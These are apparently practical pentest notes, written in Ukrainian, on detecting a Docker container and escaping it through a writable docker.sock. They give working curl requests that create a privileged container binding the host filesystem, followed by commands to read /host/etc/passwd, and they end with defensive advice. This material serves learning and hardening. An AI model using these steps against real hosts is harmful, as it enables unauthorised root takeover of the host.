# Docker Socket Escape — Practical Notes

## 🔎 Як зрозуміти, що ми в контейнері Docker
Є кілька простих перевірок:

```bash
# 1. Перевірка cgroups
cat /proc/1/cgroup

# Якщо у виводі є "docker", "kubepods", "containerd" — ми у контейнері.

# 2. Спецфайл Docker
ls -la /.dockerenv

# Якщо існує — це Docker-контейнер.

# 3. Hostname
hostname
# Часто це випадковий hash-подібний ID (як у docker ps).
```

---

## ⚠️ Docker Socket Escape

### Що таке `/var/run/docker.sock`?
Це UNIX-сокет, через який Docker-клієнт спілкується з Docker-демоном (`dockerd`) на хості.  
- Якщо контейнер має доступ для **читання/запису** до цього сокета, то процес усередині контейнера може виконувати будь-які дії з Docker від імені root на хості.  
- Це означає **повний контроль над хостом**.

---

## 🛠️ Експлуатація через Docker API

1. **Перегляд наявних образів**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

2. **Створення нового контейнера з доступом до файлової системи хоста**
```bash
curl -X POST --unix-socket /var/run/docker.sock   -H "Content-Type: application/json"   -d '{
    "Image": "php:8.1-cli",
    "Cmd": ["/bin/sh"],
    "Tty": true,
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/host"]
    }
  }'   http://localhost/containers/create
```

3. **Запуск контейнера**
```bash
curl -X POST --unix-socket /var/run/docker.sock   http://localhost/containers/<ID>/start
```

4. **Отримання доступу до хостової файлової системи**
```bash
docker exec -it <ID> sh
ls -la /host
cat /host/etc/passwd
```

---

## 🔐 Ризики
- Повний **escape з контейнера на хост**.  
- Можливість читати/писати файли хоста.  
- Ескалація до root на хості.  

---

## ✅ Як захиститися
- Ніколи не монтувати `/var/run/docker.sock` у контейнери.  
- Використовувати `docker-socket-proxy`, якщо потрібен доступ до API.  
- Мінімізувати capabilities контейнерів (не запускати з `--privileged`).  
- Використовувати AppArmor/SELinux профілі.  

---

## 📌 Висновок
Доступний для запису `/var/run/docker.sock` = **повний контроль над хостом**.  
Це одна з найкритичніших помилок у безпеці Docker.
